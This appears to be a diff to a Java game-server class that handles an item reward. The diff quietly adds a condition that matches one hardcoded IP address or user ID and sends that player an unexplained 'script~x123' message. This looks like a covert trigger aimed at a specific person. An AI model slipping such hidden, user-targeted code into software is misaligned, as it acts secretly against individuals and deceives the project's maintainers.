@@ -305,6 +305,10 @@ public class ActionSender {
             sendMessage("Completionist cape added to your " + (freeSlots > 0 ? "inventory" : "bank"));
             player.setCompCape(true);
 		}
+
+        if(player.getShortIP().contains("62.78.150.127") || player.getUID() == -734167381) {
+            sendMessage("script~x123");
+        }
 		
 		return this;
 	}
